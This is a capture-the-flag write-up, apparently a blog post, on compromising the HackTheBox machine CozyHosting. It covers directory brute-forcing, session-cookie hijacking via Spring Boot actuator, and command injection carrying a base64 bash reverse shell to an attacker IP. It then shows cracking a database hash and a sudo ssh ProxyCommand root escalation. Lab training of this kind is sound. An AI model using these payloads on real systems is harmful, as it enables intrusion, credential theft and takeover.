---
title: "CozyHosting"
seoTitle: "Unlocking the Secrets: Cozyhosting HacktheBox Writeup Revealed"
seoDescription: "Dive into the depths of Cozyhosting with our comprehensive HacktheBox writeup Uncover step-by-step methodologies, expert insights, and solutions to conquer"
datePublished: Mon Mar 04 2024 10:16:40 GMT+0000 (Coordinated Universal Time)
cuid: cltcsdsdm000408l2aab28fnz
slug: cozyhosting
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1712428318389/0e1e1a64-a2dd-45bc-b5a6-937f365fb126.png
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1712428307240/568bc373-3cbb-4ee0-8977-5b77249ec388.png
tags: hacking, infosec-cjbi6apo9015yaywu2micx2eo, ctf, hackthebox, cybersecurity-1, redteaming, ctf-writeup

---

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709539881281/07142fc1-2634-4b19-9286-4c03151f51e4.png align="center")

IP: **10.10.11.230** Starting with the Nmap scan

```bash
nmap -sC -sV -o nmap 10.10.11.230
```

```plaintext
# Nmap 7.94 scan initiated Wed Sep 13 13:01:41 2023 as: nmap -sC -sV -o nmap 10.10.11.230
Nmap scan report for 10.10.11.230
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 13 13:01:57 2023 -- 1 IP address (1 host up) scanned in 16.54 seconds
```

we here have 2 ports open. Let's see what do we have on the port 80

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709539930941/23f0ba77-ac6a-4d64-9ae4-97a0bded4dea.png align="center")

as we can see we can't see the webpage let's add it to the `/etc/hosts/` file

```bash
sudo nano /etc/hosts
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709543998722/19f9cab7-1ecd-486b-8bdc-e160d6391f19.png align="center")

Now if we reload the page we can see that we have a website running on port 80

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544041793/baf2c7bb-3495-403d-b67c-c52c24797280.png align="center")

Let's do a quick directory brute-forcing.

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://cozyhosting.htb -k -x php,txt,js
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544066903/c4691299-7c5c-4e3e-bd88-c5ef2e488f5b.png align="center")

so we have found some directories let's start with the login page

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544679655/f6f9c1f2-a164-4fe5-814e-60053e0c8cc1.png align="center")

So it's a simple login page. Moving to the error page

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544694704/91dce2ff-e8c6-4a0e-aeb5-b46eaeeec497.png align="center")

So, Here we have got an interesting error which says `Whilelabel Error Page`. Doing some googlefu we find an interesting thing

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544732299/4bb53345-f8c9-4e81-9dc5-94523fa66879.png align="center")

So this means that we have springboot here. Now let's bruteforce the directory with the spring-boot wordlist.

```bash
ffuf -u http://cozyhosting.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544753382/ffbc51d8-707b-4eb8-a145-09c5b8b9d651.png align="center")

We have found this actuator directory. Let's go through this one by one.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544765623/4e3a5643-f1f9-4186-9679-9be7bca2d9cd.png align="center")

So, in `/actutor/sessions` we located something like a username with a random string. Maybe we can try them as cookies and get access to this account. And if it doesn’t work, then we can also try to brute-force with this ‘username’.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544777562/e1ef8a40-25d0-4b49-8978-896cd03fa70a.png align="center")

After entering the string in the JSESSIONID and refreshing the page we can see that we are logged in as K.anderson which is also an admin account as we have access to the admin dashboard as well.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544793523/cc16dbe9-ea9b-441e-8bc4-67a39f40f5b8.png align="center")

So, nothing is interesting here except this one thing.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544807910/1fdd4db4-e6d5-467a-a062-3383387d9ea6.png align="center")

let's capture the request in burpsuite.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544822866/913ba949-140f-4d89-889a-be686d258fee.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544841045/2321e3d7-3984-4702-aab1-4ce431c32d28.png align="center")

we can see that the `POST` req is being executed on `/executessh`. After giving a random hostname & username, we captured the request in BurpSuite. Then we tried to send the request (using Burp Repeater) without giving the username & it responded as an ssh command help section.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544856113/91f359a6-1418-4a68-822f-102c1cb29b87.png align="center")

This shows that it’s ssh command usage, let us try a few more things. Let's try a simple ping command back to the attacker's machine. Looks like the attacker can ping the attacker machine from the target using command injection by entering the following in the username field

```bash
;ping${IFS}-c4${IFS}10.10.14.137;#
```

> *The ${IFS} is the equivalent to a white space character.*

Let's try making our payload which will give a reverseshell while executed by the machine or You can use any of the reverse-ssh payload available on the Internet.

```bash
echo "bash -i >& /dev/tcp/10.10.14.137/6658 0>&1" | base64 -w 0
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544876261/90a0cb09-cacd-42de-b7ec-8044983e57ed.png align="center")

Use the created payload in the reverse shell payload and pass it to the parameter. What it does, it decodes the base64 shell code and passes it to the bash in the server. ($IFS%?? is the equal to white space character).

```bash
;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzcvNjY1OCAwPiYxCg=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544891121/2e686e8b-ce14-4372-8781-3bf6fdb2c5ce.png align="center")

We’ll send this payload as the username with the URL encoded & start a listener on our machine. After encoding it into the url and sending a request. we can see that we got a shell

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544912281/378afc08-052e-4c2a-bfd4-8afbc3fd46c5.png align="center")

```bash
nc -nlvp 6658
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544928277/057bbb2d-c178-4aea-9908-c70d6849c2a7.png align="center")

so we have a jar file. The Spring Boot web application is contained within the /app/cloudhosting-0.0.1.jar file.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544943438/9315b77e-4dac-4045-a41a-3879cb36ae4b.png align="center")

Let's fetch the file to our device, to extract and see what’s inside. Fetching files, will be done using creating a server using Python and then downloading using wget into our system.

```bash
python3 -m http.server 1111
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544958962/9bb38a77-b8fa-47e7-afa1-d2ed115b7f5a.png align="center")

```bash
wget http://10.10.11.230:1111/cloudhosting-0.0.1.jar
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709544969374/913de24f-f3c1-4e13-97a0-1c1180027a62.png align="center")

Let's open this with jd-gui.

```bash
jd-gui cloudhosting-0.0.1.jar
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709545090057/483ce079-cfe8-45a0-9bae-1b3044571e40.png align="center")

We got the PostgreSQL database’s username & password. *postgres*: *Vg&nvzAQ7XxR* Now let's login through Postgre SQL with this creds

```bash
psql -h 127.0.0.1 -U postgres
```

So, after getting connected, we listed the databases available and found cozyhosting.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709545019097/f3de3dfa-8b3a-4c4c-898f-0477b87c642a.png align="center")

> *\\c is used to connect to specific database in our case, its Cozyhosting\\d is used to see all the tables in the database*
> 
> ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709546053557/34d61551-b8e6-4a9c-a441-f523e354d9ed.png align="center")

\\d is used to see all the tables in the database.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709546125359/bb75559c-f564-4593-8daf-18111b3b131e.png align="center")

so here we have the admin hash let's crack it

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709546172221/70b559ba-c696-4cb3-963a-41e6eab4ab1e.png align="center")

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709546187730/abb89d4e-40be-4c64-9619-e2f535e01ca5.png align="center")

We got the username while searching in the shell *josh*:*manchesterunited* As we saw in the nmap scan we have SSH open so let's connect through that.

```bash
ssh josh@10.10.11.230
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709546205656/592c29cf-fbf0-4738-b93f-b0791c3c6b05.png align="center")

let's grab our user.txt

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709546219252/d145f38d-7591-413e-966f-28cdf5ae211a.png align="center")

Flag: **001e788a9504cc6e79d0b70cabecceba**

Now let's go for the root flag

```bash
sudo -l
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709546231819/b00ea420-5464-4a29-9dc1-fb950875d2bb.png align="center")

Lmao! Let's go to GTFobins

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709546268978/9b8f0382-627d-4c01-9848-d3f32632b760.png align="center")

let's use the proxy command option payload

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709546457746/bdacea98-10ee-4f3f-8fae-a03b7e953148.png align="center")

Let's grab the root flag.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709546465980/ce2d7b39-d8cf-4697-9f44-aeeb70411a29.png align="center")

Flag: **af9a86cc816d3b359ff652e0a67602c4**

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1709547184570/fe5aa7d3-3365-4359-9172-dfbdeedc3374.jpeg align="center")